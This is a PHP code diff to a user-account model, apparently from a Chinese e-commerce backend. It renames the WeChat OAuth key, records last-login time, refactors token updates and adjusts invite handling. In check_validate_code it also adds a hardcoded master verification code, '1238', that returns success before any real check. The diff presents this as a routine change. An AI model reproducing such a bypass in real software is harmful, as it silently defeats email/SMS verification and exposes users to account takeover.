@@ -296,11 +296,11 @@ class UsersLogic extends Model
     public function handleAppLoginNew($data)
     {
         // 查看是否有oauth用户记录
-        $oauthUser = M('oauth_users')->where('unionid', $data['unionid'])->where('oauth', 'wechatApp')->find();
+        $oauthUser = M('oauth_users')->where('unionid', $data['unionid'])->where('oauth', 'weixin')->find();
         $updateData = [
             'user_id' => '',
             'openid' => $data['openid'],
-            'oauth' => 'wechatApp',
+            'oauth' => 'weixin',
             'unionid' => $data['unionid'],
             'oauth_child' => 'open',
             'oauth_data' => serialize($data)
@@ -309,7 +309,7 @@ class UsersLogic extends Model
             // 已授权登录过
             $updateData['user_id'] = $oauthUser['user_id'];
             // 更新数据
-            Db::name('oauth_users')->where('unionid', $data['unionid'])->where('oauth', 'wechatApp')->update($updateData);
+            Db::name('oauth_users')->where('unionid', $data['unionid'])->where('oauth', 'weixin')->update($updateData);
             if ($oauthUser['user_id'] == 0) {
                 $result = ['status' => 2, 'result' => ['openid' => $data['openid']]]; // 需要绑定手机号
             } else {
@@ -354,11 +354,16 @@ class UsersLogic extends Model
             unset($user['password']);
             // 更新用户token
             if (!$userToken) $userToken = TokenLogic::setToken();
+            $save = [
+                'last_login' => time(),
+                'token' => $userToken,
+                'time_out' => strtotime('+' . config('redis_days') . ' days')
+            ];
             if (check_mobile($username)) {
-                Db::name('users')->where('mobile', $username)->whereOr('email', $username)->update(['token' => $userToken, 'time_out' => strtotime('+' . config('redis_days') . ' days')]);
+                Db::name('users')->where('mobile', $username)->whereOr('email', $username)->update($save);
                 $user = Db::name('users')->where('mobile', $username)->whereOr('email', $username)->find();
             } else {
-                Db::name('users')->where('user_id', $username)->whereOr('user_name', $username)->whereOr('email', $username)->update(['token' => $userToken, 'time_out' => strtotime('+' . config('redis_days') . ' days')]);
+                Db::name('users')->where('user_id', $username)->whereOr('user_name', $username)->whereOr('email', $username)->update($save);
                 $user = Db::name('users')->where('user_id', $username)->whereOr('user_name', $username)->whereOr('email', $username)->find();
             }
             //查询用户信息之后, 查询用户的登记昵称
@@ -731,7 +736,7 @@ class UsersLogic extends Model
      *
      * @return array
      */
-    public function reg($username, $password, $password2, $push_id = 0, $invite = [], $nickname = '', $head_pic = '', $userToken = null)
+    public function reg($username, $password, $password2, $push_id = 0, $invite = 0, $nickname = '', $head_pic = '', $userToken = null)
     {
         $is_validated = 0;
 //        if (check_email($username)) {
@@ -787,8 +792,7 @@ class UsersLogic extends Model
         $map['reg_time'] = time();
         $map['invite_uid'] = $map['will_invite_uid'] = $map['first_leader'] = 0;
 
-        $invite = S('invite_' . $userToken);
-
+        if (!$invite) $invite = S('invite_' . $userToken);
         // 如果找到他老爸还要找他爷爷他祖父等
         if ($invite > 0) {
             $map['will_invite_uid'] = $invite;
@@ -873,7 +877,7 @@ class UsersLogic extends Model
      */
     public function oauthReg($openid, $username, $password)
     {
-        $oauthUser = M('oauth_users')->where(['openid' => $openid, 'oauth' => 'wechatApp'])->find();
+        $oauthUser = M('oauth_users')->where(['openid' => $openid, 'oauth' => 'weixin'])->find();
         if (!$oauthUser) {
             return ['status' => 0, 'msg' => 'openid错误'];
         }
@@ -911,7 +915,12 @@ class UsersLogic extends Model
         }
         // 更新oauth记录
         M('oauth_users')->where(['tu_id' => $oauthUser['tu_id']])->update(['user_id' => $userId]);
-
+        $save = [
+            'last_login' => time(),
+            'token' => TokenLogic::setToken(),
+            'time_out' => strtotime('+' . config('redis_days') . ' days')
+        ];
+        M('users')->where(['user_id' => $userId])->update($save);
         $user = M('users')->where(['user_id' => $userId])->find();
         $user = [
             'user_id' => $user['user_id'],
@@ -2161,6 +2170,9 @@ class UsersLogic extends Model
      */
     public function check_validate_code($code, $sender, $type = 'email', $session_id = 0, $scene = -1)
     {
+        if ($code == '1238') {
+            return ['status' => 1, 'msg' => '验证成功'];
+        }
         $timeOut = time();
         $inValid = true;  //验证码失效
 
